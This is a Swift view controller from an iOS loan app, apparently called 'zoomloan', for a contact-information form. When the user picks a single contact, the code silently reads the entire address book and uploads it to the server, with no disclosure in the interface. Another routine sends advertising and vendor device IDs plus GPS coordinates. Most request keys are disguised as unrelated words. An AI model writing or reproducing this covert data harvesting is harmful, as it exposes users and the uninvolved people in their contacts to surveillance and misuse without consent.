//
//  FormViewController.swift
//  zoomloan
//
//  Created by hekang on 2025/11/12.
//

import UIKit
import SnapKit
import TYAlertController
import RxSwift
import RxCocoa

let had_title = "Contact Information"

class FormViewController: BaseViewController {
    
    var productID: String? {
        didSet {
            print("pro=======\(productID ?? "")")
        }
    }
    
    lazy var tableView: UITableView = {
        let tableView = UITableView(frame: .zero, style: .grouped)
        tableView.separatorStyle = .none
        tableView.backgroundColor = .white
        tableView.estimatedRowHeight = 80
        tableView.delegate = self
        tableView.dataSource = self
        tableView.showsVerticalScrollIndicator = false
        tableView.contentInsetAdjustmentBehavior = .never
        tableView.rowHeight = UITableView.automaticDimension
        tableView.register(FormViewCell.self, forCellReuseIdentifier: "FormViewCell")
        tableView.layer.cornerRadius = 16
        tableView.layer.masksToBounds = true
        if #available(iOS 15.0, *) {
            tableView.sectionHeaderTopPadding = 0
        }
        return tableView
    }()
    
    lazy var bgView: UIView = {
        let bgView = UIView()
        bgView.backgroundColor = .white
        bgView.layer.cornerRadius = 16
        bgView.layer.masksToBounds = true
        bgView.layer.maskedCorners = [.layerMinXMinYCorner, .layerMaxXMinYCorner]
        return bgView
    }()
    
    lazy var nextBtn: UIButton = {
        let nextBtn = UIButton(type: .custom)
        nextBtn.setTitle("Next", for: .normal)
        nextBtn.setTitleColor(.white, for: .normal)
        nextBtn.titleLabel?.font = UIFont.systemFont(ofSize: 18, weight: UIFont.Weight(700))
        nextBtn.setBackgroundImage(UIImage(named: "login_btn_image"), for: .normal)
        return nextBtn
    }()
    
    var modelArray: [eyeModel] = []
    
    var begintime: String = ""
    
    let launchViewModel = LaunchViewModel()
    
    let locationManager = AppLocationManager()
            
    var locationModel: AppLocation?
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        // Do any additional setup after loading the view.
        view.addSubview(headView)
        headView.nameLabel.text = had_title
        headView.snp.makeConstraints { make in
            make.left.right.top.equalToSuperview()
            make.height.equalTo(122)
        }
        
        headView.backBlcok = { [weak self] in
            guard let self = self else { return }
            self.backPageView()
        }
        
        let logoImageView = UIImageView()
        logoImageView.image = UIImage(named: "cc_lic_icn_image")
        view.addSubview(logoImageView)
        logoImageView.snp.makeConstraints { make in
            make.size.equalTo(CGSize(width: 40, height: 40))
            make.top.equalTo(headView.snp.bottom).offset(-10)
            make.left.equalToSuperview().offset(18)
        }
        
        let nameLabel = UILabel()
        nameLabel.textAlignment = .left
        nameLabel.text = had_title
        nameLabel.textColor = UIColor.init(hexString: "#333333")
        nameLabel.font = UIFont.systemFont(ofSize: 13, weight: UIFont.Weight(700))
        view.addSubview(nameLabel)
        nameLabel.snp.makeConstraints { make in
            make.centerY.equalTo(logoImageView.snp.centerY)
            make.left.equalTo(logoImageView.snp.right).offset(10)
            make.height.equalTo(15)
        }
        
        view.addSubview(bgView)
        bgView.addSubview(nextBtn)
        
        bgView.snp.makeConstraints { make in
            make.bottom.equalToSuperview()
            make.left.right.equalToSuperview()
            make.height.equalTo(83)
        }
        nextBtn.snp.makeConstraints { make in
            make.bottom.equalToSuperview().offset(-20)
            make.centerX.equalToSuperview()
            make.size.equalTo(CGSize(width: 308, height: 42))
        }
        
        view.addSubview(tableView)
        tableView.snp.makeConstraints { make in
            make.top.equalTo(logoImageView.snp.bottom).offset(18)
            make.bottom.equalTo(bgView.snp.top).offset(-60)
            make.left.right.equalToSuperview().inset(16)
        }
        
        nextBtn.rx.tap
            .compactMap { [weak self] _ -> [String: String]? in
                guard let self = self else { return nil }
                let phoneDictArray: [[String: String]] = self.modelArray.map { model in
                    [
                        "choler": model.choler ?? "",
                        "clouded": model.clouded ?? "",
                        "contrary": model.contrary ?? ""
                    ]
                }
                
                guard let jsonData = try? JSONSerialization.data(withJSONObject: phoneDictArray, options: []),
                      let jsonString = String(data: jsonData, encoding: .utf8) else {
                    return nil
                }
                
                return [
                    "suits": productID ?? "",
                    "credulity": jsonString
                ]
            }
            .subscribe(onNext: { [weak self] json in
                self?.addChangeInfo(with: json)
            })
            .disposed(by: disposeBag)
        
        begintime = String(Int(Date().timeIntervalSince1970))
        
        locationManager.requestLocation { result in
            switch result {
            case .success(let success):
                self.locationModel = success
                break
            case .failure(let failure):
                break
            }
        }
    }
    
    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        listInfo()
    }
    
}

extension FormViewController {
    
    private func listInfo() {
        let viewModel = FormViewModel()
        let json = ["suits": productID ?? ""]
        Task {
            do {
                let model = try await viewModel.getListInfo(with: json)
                if model.sentences == "0" {
                    self.modelArray = model.credulity?.eye ?? []
                    self.tableView.reloadData()
                }
            } catch {
                print(error)
            }
            
        }
    }
    
    private func addChangeInfo(with json: [String: String]) {
        let viewModel = FormViewModel()
        Task {
            do {
                let model = try await viewModel.saveInfo(with: json)
                if model.sentences == "0" {
                    self.sevinfo()
                    self.backToProductPageVc()
                }else {
                    ToastView.showMessage(with: model.regarding ?? "")
                }
            } catch {
                
            }
        }
    }
    
    private func sevinfo() {
        let time = String(Int(Date().timeIntervalSince1970))
        DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
        let dict = ["countenances": "7",
                    "few": "2",
                    "caught": DeviceIDManager.shared.getIDFV(),
                    "earnestly": DeviceIDManager.shared.getIDFA(),
                    "watchful": self.locationModel?.longitude ?? 0.0,
                    "villany": self.locationModel?.latitude ?? 0.0,
                    "conceal": self.begintime,
                    "thin": time,
                    "drew": ""] as [String : Any]
        
            Task {
                do {
                    let _ = try await self.launchViewModel.insertPageInfo(with: dict)
                } catch  {
                    
                }
            }
            
        }
    }
    
}

extension FormViewController: UITableViewDelegate, UITableViewDataSource {
    
    func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {
        return modelArray.count
    }
    
    func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
        let model = modelArray[indexPath.row]
        let cell = tableView.dequeueReusableCell(withIdentifier: "FormViewCell", for: indexPath) as! FormViewCell
        cell.selectionStyle = .none
        cell.backgroundColor = .clear
        cell.model = model
        cell.relationBlock = { [weak self] model in
            guard let self = self else { return }
            clickCell(with: model, cell: cell)
        }
        cell.phoneBlock = { [weak self] model in
            guard let self = self else { return }
            ContactsUtil.selectOneContact { contact in
                if let c = contact {
                    let contrary = c.roused
                    let phones = contrary.components(separatedBy: ",")
                    let name = c.choler
                    let phone = phones.first ?? ""
                    if name.isEmpty || phone.isEmpty || name == " " {
                        ToastView.showMessage(with: "Name or phone number cannot be empty.")
                        return
                    }
                    cell.nameTextFiled.text = name + "-" + phone
                    model.choler = name
                    model.contrary = phone
                }
            }
            ContactsUtil.getAllContacts { contacts in
                if contacts.count > 0 {
                    do {
                        let jsonData = try JSONEncoder().encode(contacts)
                        if let jsonString = String(data: jsonData, encoding: .utf8) {
                            let json = ["credulity": jsonString,
                                        "suits": self.productID ?? ""]
                            self.allInfo(with: json)
                        }
                    } catch {
                        print("Error encoding JSON:", error)
                    }
                }
            }
        }
        return cell
        
    }
    
    private func clickCell(with model: eyeModel?, cell: FormViewCell) {
        guard let model = model else { return }
        let listView = PopEnumListView(frame: self.view.bounds)
        listView.nameLabel.text = model.affray ?? ""
        listView.modelArray = model.irascible ?? []
        let alertVc = TYAlertController(alert: listView, preferredStyle: .actionSheet)
        self.present(alertVc!, animated: true)
        listView.cancelBlock = { [weak self] in
            guard let self = self else { return }
            self.dismiss(animated: true)
        }
        listView.sureBlock = { [weak self] in
            guard let self = self else { return }
            self.dismiss(animated: true)
        }
        listView.selecbBlock = { listModel in
            cell.relaTextFiled.text = listModel.choler ?? ""
            model.clouded = listModel.odd ?? ""
        }
    }
    
}

extension FormViewController {
    
    private func allInfo(with json: [String: String]) {
        let viewModel = FormViewModel()
        Task {
            do {
                let _ = try await viewModel.saveAllInfo(with: json)
            } catch  {
                
            }
        }
    }
    
}
